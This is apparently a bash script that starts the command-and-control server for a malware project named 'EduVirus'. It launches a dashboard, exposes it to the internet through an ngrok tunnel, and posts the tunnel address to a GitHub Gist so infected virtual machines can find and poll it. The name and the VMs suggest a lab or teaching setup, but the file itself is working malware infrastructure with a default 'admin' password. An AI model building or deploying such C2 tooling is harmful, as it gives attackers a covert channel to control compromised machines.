#!/bin/bash
# One-click startup for EduVirus C2
# Starts the dashboard + ngrok + sets the Gist
#
# Usage: bash start-c2.sh
#        bash start-c2.sh --no-ngrok   # Dashboard only, no tunnel
#        bash start-c2.sh --kill       # Stop everything

cd "$(dirname "$0")"

DASHBOARD_PID=""
NGROK_PID=""
NGROK_PORT=5000

kill_all() {
    echo "Stopping everything..."
    taskkill //f //im python.exe 2>/dev/null
    taskkill //f //im ngrok.exe 2>/dev/null
    echo "Done."
    exit 0
}

if [ "$1" = "--kill" ]; then
    kill_all
fi

# Kill any existing instances first
echo "[*] Cleaning up old processes..."
taskkill //f //im python.exe 2>/dev/null
taskkill //f //im ngrok.exe 2>/dev/null
sleep 2

# Start the dashboard
echo "[*] Starting dashboard on port $NGROK_PORT..."
python dashboard.py &
DASHBOARD_PID=$!
sleep 3

# Check dashboard is alive
curl -s http://127.0.0.1:$NGROK_PORT/login > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "[!] Dashboard failed to start!"
    exit 1
fi
echo "[✓] Dashboard running at http://127.0.0.1:$NGROK_PORT"

if [ "$1" = "--no-ngrok" ]; then
    echo ""
    echo "=== C2 DASHBOARD: http://127.0.0.1:$NGROK_PORT ==="
    echo "Password: admin"
    echo ""
    echo "To stop: bash start-c2.sh --kill"
    wait
    exit 0
fi

# Start ngrok
echo "[*] Starting ngrok tunnel..."
./ngrok.exe http http://127.0.0.1:$NGROK_PORT --log=stdout > /dev/null &
NGROK_PID=$!
sleep 5

# Fetch the ngrok URL
NGROK_URL=""
for i in 1 2 3 4 5; do
    NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for t in data.get('tunnels', []):
        if t.get('public_url', '').startswith('https://'):
            print(t['public_url'])
            break
except: pass
" 2>/dev/null)
    if [ -n "$NGROK_URL" ]; then
        break
    fi
    sleep 2
done

if [ -z "$NGROK_URL" ]; then
    echo "[!] Could not get ngrok URL. Check ngrok manually."
    echo "    Try: curl http://127.0.0.1:4040/api/tunnels"
else
    echo "[✓] ngrok tunnel: $NGROK_URL"
    
    # Set the ngrok URL in the Gist
    ./set-ngrok "$NGROK_URL"
    echo "[✓] Gist updated with ngrok URL"
fi

echo ""
echo "============================================"
echo "  C2 CONTROL CENTER ACTIVE"
echo "============================================"
echo "  Dashboard:  http://127.0.0.1:$NGROK_PORT"
echo "  Ngrok URL:  $NGROK_URL"
echo "  Password:   admin"
echo ""
echo "  VMs will auto-detect ngrok within 15s"
echo "  and switch to 5s polling mode."
echo ""
echo "  To stop:    bash start-c2.sh --kill"
echo "============================================"

# Keep running
wait
